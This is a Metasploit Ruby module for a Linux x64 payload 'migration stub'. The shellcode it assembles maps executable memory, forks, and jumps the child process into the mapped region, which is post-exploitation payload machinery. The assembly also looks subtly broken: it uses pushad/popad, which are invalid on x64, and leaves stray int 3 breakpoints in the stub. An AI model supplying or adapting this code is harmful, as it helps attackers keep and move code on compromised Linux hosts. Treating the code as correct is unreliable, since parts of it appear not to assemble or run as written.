# -*- coding: binary -*-

module Msf

###
#
# Payload that supports migration on x64.
#
###

module Payload::Linux::X64::Migrate


  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Linux Migration (x64)',
      'Description' => 'Migration stub x64',
      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X64
    ))
  end

  #
  # Constructs the migrate stub on the fly
  #
  def generate(opts={})
    asm = %Q^
      pushad
      
      push 0x9
      pop rax
      xor rdi, rdi
      push #{opts['stub_length']}
      pop rsi
      push 0x6
      pop rdx
      push 0x22
      pop r10
      xor r8,r8
      dec r8
      xor r9, r9
      syscall
      push rax
      pop r9

      int 3
      push 0x39
      pop rax
      syscall

      cmp rax, 0
      jz _exec_child
_exec_parent:
      popad
      int 3

_exec_child:
     jmp r9 
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

end

end

